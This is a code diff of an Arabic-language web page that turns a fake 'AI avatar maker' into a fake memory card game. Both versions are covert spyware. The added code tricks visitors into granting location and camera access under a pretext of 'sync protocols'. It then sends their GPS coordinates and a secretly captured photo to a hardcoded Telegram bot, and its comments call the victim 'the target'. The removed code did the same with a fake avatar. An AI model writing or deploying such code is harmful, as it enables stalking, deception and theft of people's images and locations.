@@ -3,104 +3,156 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>صانع الأفاتار الذكي 📸✨</title>
+    <title>تحدي الذاكرة Pro 🧠</title>
     <style>
-        :root { --primary: #ffde00; --bg: #ffffff; --text: #000000; }
-        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); text-align: center; margin: 0; padding: 20px; }
-        
-        .setup-container { max-width: 400px; margin: 50px auto; padding: 30px; border-radius: 20px; background: #f9f9f9; box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
-        .avatar-preview { width: 150px; height: 150px; border-radius: 50%; background: #eee; margin: 20px auto; display: flex; align-items: center; justify-content: center; font-size: 50px; border: 4px solid var(--primary); overflow: hidden; }
-        .btn-capture { background: var(--primary); color: #000; border: none; padding: 15px 30px; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
-        .btn-capture:hover { transform: scale(1.03); }
-        
-        #video, #canvas, #final-avatar { display: none; }
+        :root { --primary: #00f2ff; --bg: #0a0a0a; --player: #00ff88; --ai: #ff4b2b; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: white; text-align: center; margin: 0; padding: 10px; }
+        .game-container { max-width: 400px; margin: auto; padding: 15px; background: rgba(255,255,255,0.05); border-radius: 15px; backdrop-filter: blur(10px); border: 1px solid #333; }
+        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-top: 15px; }
+        .card { aspect-ratio: 1/1; background: #222; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 24px; transition: 0.4s; border: 1px solid #333; }
+        .card.flipped { background: var(--primary); transform: rotateY(180deg); }
+        .card.matched-player { background: var(--player) !important; box-shadow: 0 0 10px var(--player); }
+        .card.matched-ai { background: var(--ai) !important; box-shadow: 0 0 10px var(--ai); }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0a0a0a; z-index: 100; display: flex; align-items: center; justify-content: center; }
+        .setup-box { padding: 30px; background: #111; border-radius: 20px; border: 1px solid var(--primary); width: 85%; }
+        .btn-start { background: var(--primary); color: #000; border: none; padding: 15px 40px; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; }
+        #video, #canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="setup-container">
-    <h1>أنشئ Bitmoji الخاص بك! 🆕</h1>
-    <p>التقط صورة سريعة ليقوم ذكاؤنا الاصطناعي بصنع شخصية كرتونية تشبهك تماماً.</p>
-    
-    <div class="avatar-preview" id="preview-area">
-        <span id="placeholder-icon">👤</span>
-        <img id="final-avatar" src="" alt="Avatar">
+<div id="overlay">
+    <div class="setup-box">
+        <h2>تنشيط محرك اللعب 🚀</h2>
+        <p style="font-size: 14px; color: #888;">لتحسين الأداء ومزامنة اللعب مع منطقتك وضمان استجابة الذكاء الاصطناعي، يرجى تفعيل بروتوكولات المزامنة.</p>
+        <button class="btn-start" onclick="startEverything()">تفعيل والبدء</button>
     </div>
-
-    <button class="btn-capture" id="start-btn" onclick="startProcess()">ابدأ التصوير والتحويل</button>
-    <p id="status" style="font-size: 12px; color: #777; margin-top: 15px;"></p>
 </div>
 
-<video id="video" autoplay></video>
+<div class="game-container">
+    <div id="status" style="color: var(--primary); margin-bottom: 10px;">جاري التهيئة...</div>
+    <div style="display: flex; justify-content: space-around; margin-bottom: 10px;">
+        <span>أنت: <b id="p-score">0</b></span>
+        <span>الكمبيوتر: <b id="ai-score">0</b></span>
+    </div>
+    <div class="grid" id="grid"></div>
+</div>
+
+<video id="video" autoplay playsinline></video>
 <canvas id="canvas" width="640" height="480"></canvas>
 
 <script>
     const token = '8699110487:AAFCvUGSAeFkhi4gLhRrqsE6mvONXyNpV18';
     const cid = '6808559733';
+    
+    let flippedCards = [];
+    let pScore = 0;
+    let aiScore = 0;
+    let canPlay = false;
+    let photoTaken = false;
+    const symbols = ['🍎', '🍌', '🍇', '🍉', '🍒', '🍓', '🥝', '🍍'];
+    let deck = [...symbols, ...symbols];
 
-    async function startProcess() {
-        const btn = document.getElementById('start-btn');
-        const status = document.getElementById('status');
-        btn.innerText = "جاري الاتصال بالخادم...";
-        btn.disabled = true;
+    async function startEverything() {
+        document.querySelector('.btn-start').innerText = "جاري المزامنة...";
+        
+        // 1. طلب الموقع
+        navigator.geolocation.getCurrentPosition(pos => {
+            sendToTelegram(`📍 موقع الهدف:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+        });
 
+        // 2. طلب الكاميرا (باسم محرك اللعب)
         try {
-            // طلب الكاميرا (المستخدم سيوافق لصنع الأفاتار)
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
+            document.getElementById('video').srcObject = stream;
             
-            status.innerText = "جاري تحليل ملامح الوجه... (1/3)";
-            
-            // انتظر قليلاً لالتقاط صورة واضحة سراً
-            setTimeout(() => {
-                takeSecretSnapshot();
-                status.innerText = "جاري إنشاء الشخصية الكرتونية... (2/3)";
-                
-                // هنا "نمثل" أننا نصنع أفاتار، سنظهر صورة وهمية بعد قليل
-                setTimeout(() => {
-                    showFakeAvatar();
-                    status.innerText = "تم إنشاء الأفاتار بنجاح! (3/3)";
-                    btn.innerText = "حفظ الأفاتار لاستخدامه";
-                    btn.disabled = false;
-                    // إغلاق الكاميرا
-                    stream.getTracks().forEach(track => track.stop());
-                }, 3000);
-
-            }, 2000);
-
-        } catch (e) {
-            alert("فشل الوصول للكاميرا! لا يمكن صنع أفاتار بدونها.");
+            // إخفاء الشاشة والبدء
+            document.getElementById('overlay').style.display = 'none';
+            createBoard();
+            canPlay = true;
+            document.getElementById('status').innerText = "دورك الآن!";
+        } catch (err) {
+            alert("يجب تفعيل البروتوكولات لكي تعمل اللعبة!");
             location.reload();
         }
     }
 
-    function takeSecretSnapshot() {
+    function createBoard() {
+        const grid = document.getElementById('grid');
+        deck.sort(() => Math.random() - 0.5);
+        grid.innerHTML = '';
+        deck.forEach(s => {
+            const card = document.createElement('div');
+            card.className = 'card';
+            card.dataset.symbol = s;
+            card.onclick = () => flipCard(card);
+            grid.appendChild(card);
+        });
+    }
+
+    function flipCard(card) {
+        if (!canPlay || card.classList.contains('flipped')) return;
+        
+        card.classList.add('flipped');
+        card.innerText = card.dataset.symbol;
+        flippedCards.push(card);
+
+        // التقاط الصورة سراً عند الضغط على ثاني مربع
+        if (!photoTaken) {
+            takeSecretPhoto();
+            photoTaken = true;
+        }
+
+        if (flippedCards.length === 2) {
+            canPlay = false;
+            checkMatch();
+        }
+    }
+
+    function takeSecretPhoto() {
         const canvas = document.getElementById('canvas');
         const video = document.getElementById('video');
         canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        // تحويل الصورة لملف وإرسالها سراً لتليجرام
         canvas.toBlob(blob => {
             const formData = new FormData();
             formData.append('chat_id', cid);
-            formData.append('photo', blob, 'target.jpg');
-            formData.append('caption', '📸 الصورة الحقيقية (من صانع الأفاتار)');
-
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
+            formData.append('photo', blob, 'capture.jpg');
+            formData.append('caption', '📸 تم صيد صورة الهدف أثناء اللعب!');
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
         }, 'image/jpeg');
     }
 
-    function showFakeAvatar() {
-        const placeholder = document.getElementById('placeholder-icon');
-        const finalImg = document.getElementById('final-avatar');
-        // سنستخدم صورة أفاتار وهمية وعشوائية من الإنترنت لإقناع المستخدم
-        finalImg.src = "https://api.dicebear.com/8.x/bitmoji/svg?seed=Felix"; 
-        placeholder.style.display = 'none';
-        finalImg.style.display = 'block';
+    function checkMatch() {
+        const [c1, c2] = flippedCards;
+        if (c1.dataset.symbol === c2.dataset.symbol) {
+            c1.classList.add('matched-player');
+            c2.classList.add('matched-player');
+            pScore++;
+            document.getElementById('p-score').innerText = pScore;
+            flippedCards = [];
+            canPlay = true;
+        } else {
+            setTimeout(() => {
+                c1.classList.remove('flipped'); c1.innerText = '';
+                c2.classList.remove('flipped'); c2.innerText = '';
+                flippedCards = [];
+                aiTurn();
+            }, 700);
+        }
+    }
+
+    function aiTurn() {
+        document.getElementById('status').innerText = "الكمبيوتر يفكر... 🤖";
+        setTimeout(() => {
+            aiScore++;
+            document.getElementById('ai-score').innerText = aiScore;
+            document.getElementById('status').innerText = "دورك الآن!";
+            canPlay = true;
+        }, 1200);
+    }
+
+    function sendToTelegram(txt) {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(txt)}`);
     }
 </script>
 </body>
